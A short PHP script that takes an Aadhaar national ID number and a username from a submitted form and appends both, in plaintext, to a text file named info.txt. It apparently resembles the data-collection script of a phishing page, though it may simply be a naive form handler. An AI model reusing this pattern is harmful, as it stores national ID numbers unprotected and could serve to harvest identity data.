<?php
$aadhar_no = $_POST['aadhar_no'];
$username = $_POST['username'];
$data = "Aadhar Number: $aadhar_no, Username: $username";

$file = fopen('info.txt', 'a');
fwrite($file, $data . PHP_EOL);
fclose($file);
?>
